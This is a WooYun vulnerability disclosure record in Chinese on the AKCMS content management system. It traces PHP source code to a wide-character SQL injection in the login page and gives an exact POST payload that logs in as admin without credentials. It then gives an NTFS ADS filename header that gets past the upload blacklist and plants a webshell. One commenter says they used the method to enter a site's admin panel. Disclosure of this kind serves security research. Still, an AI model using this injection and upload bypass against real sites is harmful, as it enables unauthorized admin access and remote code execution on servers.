{"id": 34912, "wybug_id": "wooyun-2015-0105186", "wybug_title": "AKCMS 注入到getshell打包", "wybug_corp": "AKCMS程序", "wybug_author": "Th1nk", "wybug_date": "2015-04-01 18:02", "wybug_open_date": "2015-07-05 18:05", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["后台验证绕过", "上传绕过"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-06：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-05：\t细节向公众公开  简要描述： AKCMS 注入到getshell打包 详细说明：  最新版本，安装时选择gbk字符编码其实有点鸡肋，要知道后台目录。我本地的后台目录是/akcms1.sql注入/akcms/login.php\nif(isset($post_loginsubmit)) {\t//宽字符注入\tif($editor = $db->get_by('*', 'admins', \"editor='\".$db->addslashes($post_username).\"'\")) {\t\tif(ak_md5($post_password, 0, 2) == $editor['password']) {\t\t\tif($editor['freeze'] == 1) adminmsg($lan['youarefreeze'], 'index.php', 3, 1);\t\t\tif(!empty($post_rememberlogin)) {\t\t\t\tsetlogin($post_username, $thetime + 24 * 3600 * 365 * 10);\t\t\t} else {\t\t\t\tsetlogin($post_username);\t\t\t}\t\t\t$target = 'index.php';\t\t\tif(ifthemeuninstalled()) $target = 'index.php?file=theme&action=themeinstall';\t\t\tadminmsg($lan['login_success'], $target);\t\t} else {\t\t\tadminmsg($lan['login_failed'], 'index.php?file=login', 3, 1);\t\t}\t} else {\t\tadminmsg($lan['login_failed'], 'index.php?file=login', 3, 1);\t}} else {\tdisplaytemplate('login.htm');}\n直接将post传递过来的用户名addslashes之后放入get_by函数。跟入/akcms/include/db.class.php\nfunction get_by($what, $from, $where = '', $orderby = '') {\t\t$table = $this->fulltablename($from);\t\t$sql = \"SELECT {$what} FROM `{$table}`\";\t\tif($where != '') $sql .= \" WHERE {$where}\";\t\tif($orderby != '') $sql .= \" ORDER BY {$orderby}\";\t\tif(strpos($what, '(') === false) $sql .= \" LIMIT 1\";\t\t$row = $this->get_one($sql);\t\tif($row === false) {\t\t\treturn false;\t\t} elseif(count($row) == 1) {\t\t\treturn current($row);\t\t} else {\t\t\treturn $row;\t\t}\t}\n调用到get_one函数，跟入\nfunction get_one($sql) {\t\t$arr = $this->querytoarray($sql, '', 1);\t\tif(count($arr) > 0) return array_shift($arr);\t\treturn false;\t}\nquerytoarray函数，跟入\nfunction querytoarray($sql, $key = '', $num = 1000) {\t\tglobal $sqlcaches;\t\t$results = array();\t\tif(!empty($GLOBALS['batchcreateitemflag'])) {\t\t\tif(!isset($sqlcaches)) $sqlcaches = array();\t\t\t$cachekey = $sql.'*'.$num;\t\t\tif(isset($sqlcaches[$cachekey])) {\t\t\t}\t\t}\t\t$query = $this->query($sql);\t\t$i = 1;\t\twhile($row = $this->fetch_array($query)) {\t\t\tif($key == '' || !isset($row[$key])) {\t\t\t\t$results[$i] = $row;\t\t\t} else {\t\t\t\t$results[$row[$key]] = $row;\t\t\t}\t\t\tif($i ++ >= $num) break;\t\t}\t\treturn $results;\t}\n继续调用到query函数 跟入。\nfunction query($sql, $ignoresafe = 0) {\t\tglobal $ifdebug, $slowquery, $thetime;\t\tif(!empty($ifdebug)) $start = akmicrotime();\t\tif(empty($ignoresafe)) {\t\t\tif(preg_match('/^(select|delete)\\s+.*?(select|update|detele|insert|replace)\\s+/i', $sql, $match)) {\t\t\t\teventlog(\"REJECT\\t\".$sql, 'sql');\t\t\t\treturn false;\t\t\t}\t\t}\t\tif($ignoresafe == 1 && strpos($sql, \";\\n\") != false) {\t\t\t$sqls = explode(\";\\n\", $sql);\t\t\tforeach($sqls as $sql) {\t\t\t\tif(trim($sql) != \"\") $query = $this->_query($sql);\t\t\t}\t\t} else {\t\t\t$query = $this->_query($sql);\t\t}\t\tif(!$query) $this->halt($this->error(), $sql);\t\tif(!empty($ifdebug)) {\t\t\t$usedtime = akmicrotime() - $start;\t\t\tif(empty($slowquery) || $usedtime > $slowquery) {\t\t\t\teventlog(msformat(akmicrotime() - $start).\"\\t\".$sql, 'sql');\t\t\t}\t\t}\t\tif($sql != 'BEGIN;') {\t\t\t$this->querynum++;\t\t\tif(!empty($ifdebug)) $sql = msformat(akmicrotime() - $start).' '.$sql;\t\t\tif($this->querynum < 1000) $this->queries[] = $sql;\t\t}\t\treturn $query;\t}\n可以看到，对于注入的防御只有这么一句\nif(preg_match('/^(select|delete)\\s+.*?(select|update|detele|insert|replace)\\s+/i', $sql, $match)) {\t\t\t\teventlog(\"REJECT\\t\".$sql, 'sql');\t\t\t\treturn false;\t\t\t}\n这实在是很容易绕过的。并且gbk又没有设置安全的连接方式，可以采用宽字符注入绕过。2.getshell登陆到后台后，可以getshell/akcms/upload.php5-18行\nif(isset($_SERVER['HTTP_CONTENT_DISPOSITION']) && preg_match('/attachment;\\s+name=\"(.+?)\";\\s+filename=\"(.+?)\"/i',$_SERVER['HTTP_CONTENT_DISPOSITION'], $info)){\t//getshell\t$filename = fromutf8(urldecode($info[2]));\tif(fileext($filename) == 'php') aexit();\t$newfilename = get_upload_filename($filename, 0, 0, 'image');\t$a = file_get_contents(\"php://input\");\tif(!checkuploadfile($a)) {\t\tuploaddanger($lan['danger']);\t} else {\t\twritetofile($a, FORE_ROOT.$newfilename);\t}}\n可以看到这是一个基于黑名单的检测机制，那就有好多绕过方式了。windows下可以用ADS的文件流绕过，apache或者nginx下可以尝试php1-6绕过。相当简单。   漏洞证明：  1.sql注入\n\n构造一个万能密码直接登陆后台。post传递\naction=login&username=11111%df%27 union select/**/1,2,md5(md5(3)),4,5,6%23&password=3&loginsubmit=%B5%C7%C2%BC\n\n\n成功登陆后台。2.getshell添加header头\nCONTENT-DISPOSITION: attachment; name=\"123456\"; filename=\"1.php::$DATA\"\n利用ntfs的ads流来绕过后缀检测\n\n得到shell地址http://127.0.0.1/pictures/2015/04/iJrV1T.php\n\n   修复方案：  过滤过滤   版权声明：转载请注明来源 Th1nk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-07-05 18:05 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-03 23:22 |    \t\t写个七 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 一点一点积累。)\t\t \n  牛逼的音符哥， 用你方法成功进入后台   但是getshell  小白不懂 求详细科普    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}